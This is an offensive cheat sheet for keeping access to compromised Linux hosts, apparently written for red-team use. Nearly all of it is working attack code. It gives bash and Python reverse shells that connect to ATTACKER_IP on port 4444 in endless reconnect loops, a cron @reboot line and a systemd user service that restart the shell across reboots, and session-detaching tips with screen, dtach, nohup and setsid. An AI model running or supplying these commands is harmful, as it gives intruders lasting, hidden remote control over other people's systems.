# Linux Persistence

## Reverse Shells

**Target (background, auto-reconnect):**

```bash
( while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 10; done ) & disown
```

**Alternate (Python one-liner wrapped for reconnect):**

```bash
( while true; do python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"])'; sleep 10; done ) & disown
```

**Cron it:**

```bash
crontab -e
# add a line (example: run a reconnect script at reboot)
@reboot (sleep 60; while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 10; done) &
```

---

## Sessions (No tmux)

### Screen

Often available when tmux is not.

```bash
# screen
screen -S redteam
# inside: run tools
# detach: Ctrl-a d
# reattach: screen -r redteam

# dtach (if present)
dtach -A /tmp/attach.sock -z bash
# detach: Ctrl-\, reattach: dtach -a /tmp/attach.sock
```

---

### Simple background

When you only need a job to continue after logout (no interactive reattach).

```bash
# start a long job in background and detach it from shell
nohup command -args > /tmp/command.out 2>&1 &
# if using bash/zsh: disown the job so SIGHUP won't kill it
disown %1

# check later after reconnect:
tail -f /tmp/command.out

# Alternative if nohup is odd
setsid command -args -o /tmp/command.log </dev/null >/dev/null 2>&1 &
```

## Systemd

### User unit

Create `~/.config/systemd/user/persist-shell.service`:

```ini
[Unit]
Description=Persistent reverse shell loop

[Service]
Type=simple
ExecStart=/bin/bash -lc 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 10; done'
Restart=always

[Install]
WantedBy=default.target
```

Enable & start (user unit):

```bash
systemctl --user daemon-reload
systemctl --user enable --now persist-shell.service
```

